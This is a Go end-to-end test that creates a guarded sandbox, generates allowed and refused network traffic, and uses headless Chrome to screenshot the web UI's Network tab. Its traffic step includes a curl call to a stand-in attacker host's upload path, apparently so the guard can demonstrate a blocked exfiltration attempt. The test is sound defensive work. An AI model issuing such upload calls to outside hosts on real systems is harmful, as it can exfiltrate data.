//go:build e2e

package e2e

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"github.com/gorilla/websocket"
)

// A visual check of the web UI against a live cluster, not an assertion: it creates a guarded
// sandbox, gives it some network activity, opens its Network tab in headless Chrome and saves a
// screenshot. Opt in with IGLOO_E2E_SHOT=<output.png> (plus the guard test's requirements).

type cdp struct {
	t    *testing.T
	conn *websocket.Conn
	id   int
}

// call sends a DevTools command and waits for its answer, ignoring events.
func (c *cdp) call(method string, params map[string]any) json.RawMessage {
	c.t.Helper()
	c.id++
	if err := c.conn.WriteJSON(map[string]any{"id": c.id, "method": method, "params": params}); err != nil {
		c.t.Fatalf("%s: %v", method, err)
	}
	c.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	for {
		var m struct {
			ID     int             `json:"id"`
			Result json.RawMessage `json:"result"`
			Error  *struct{ Message string }
		}
		if err := c.conn.ReadJSON(&m); err != nil {
			c.t.Fatalf("%s: %v", method, err)
		}
		if m.ID == c.id {
			if m.Error != nil {
				c.t.Fatalf("%s: %s", method, m.Error.Message)
			}
			return m.Result
		}
	}
}

func (c *cdp) eval(js string) {
	c.t.Helper()
	c.call("Runtime.evaluate", map[string]any{"expression": js, "awaitPromise": true})
}

func TestScreenshotOfTheNetworkTab(t *testing.T) {
	out := os.Getenv("IGLOO_E2E_SHOT")
	if out == "" {
		t.Skip("set IGLOO_E2E_SHOT=<file.png> to capture the Network tab")
	}
	c := guardedLogin(t)

	var sb struct{ ID string }
	c.json("POST", "/api/sandboxes", map[string]any{
		"name": "ui-check", "ttl_seconds": 600, "image": image,
		"guard": map[string]any{
			"allow": []string{upstreamHost}, "allow_private": true,
			"routes": []map[string]string{{"name": "internal", "upstream": "http://" + upstreamHost + ":8080", "header": "X-Api-Key", "secret": "UPSTREAM_KEY"}},
		},
	}, 201, &sb)
	t.Cleanup(func() { c.do("DELETE", "/api/sandboxes/"+sb.ID, nil) })
	c.waitStatus(sb.ID, "running", 5*time.Minute)

	// Give it something to show: allowed, refused, and a credential route.
	c.exec(sb.ID, "sh", "-c", `curl -s -m 8 -o /dev/null http://`+upstreamHost+`:8080/; curl -s -m 8 -o /dev/null https://attacker.example/upload; curl -s -m 8 -o /dev/null http://example.com/; curl -s -m 8 -o /dev/null -H "Authorization: Bearer $IGLOO_ROUTE_TOKEN" "$IGLOO_ROUTE_BASE/internal/report"`)
	time.Sleep(3 * time.Second) // let the gateway deliver its batch

	chrome := env("CHROME", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome")
	profile := t.TempDir()
	cmd := exec.Command(chrome, "--headless=new", "--disable-gpu", "--remote-debugging-port=9333",
		"--user-data-dir="+profile, "--window-size=1440,960", "about:blank")
	if err := cmd.Start(); err != nil {
		t.Skipf("cannot start Chrome: %v", err)
	}
	t.Cleanup(func() { cmd.Process.Kill(); cmd.Wait() })

	var targets []struct {
		Type string `json:"type"`
		WS   string `json:"webSocketDebuggerUrl"`
	}
	for i := 0; i < 40; i++ {
		if resp, err := http.Get("http://127.0.0.1:9333/json"); err == nil {
			json.NewDecoder(resp.Body).Decode(&targets)
			resp.Body.Close()
			if len(targets) > 0 {
				break
			}
		}
		time.Sleep(250 * time.Millisecond)
	}
	var wsURL string
	for _, tg := range targets {
		if tg.Type == "page" {
			wsURL = tg.WS
		}
	}
	if wsURL == "" {
		t.Fatal("no Chrome page to drive")
	}
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	d := &cdp{t: t, conn: conn}

	d.call("Page.enable", nil)
	d.call("Page.navigate", map[string]any{"url": base + "/"})
	time.Sleep(2 * time.Second)
	d.eval(fmt.Sprintf("localStorage.setItem('igloo_token', %q)", c.token))
	d.call("Page.navigate", map[string]any{"url": base + "/"})
	time.Sleep(4 * time.Second) // sign in, load the workspace list
	d.eval(fmt.Sprintf("app.openWorkspace(%q)", sb.ID))
	time.Sleep(1 * time.Second)
	d.eval("app.setWsDetailTab('activity')")
	time.Sleep(3 * time.Second) // let the panel fetch and render

	var shot struct{ Data string }
	json.Unmarshal(d.call("Page.captureScreenshot", map[string]any{"format": "png"}), &shot)
	png, err := base64.StdEncoding.DecodeString(shot.Data)
	if err != nil || len(png) < 2000 {
		t.Fatalf("screenshot failed: %v (%d bytes)", err, len(png))
	}
	if err := os.WriteFile(out, png, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Logf("saved %s (%d bytes)", filepath.Base(out), len(png))
}
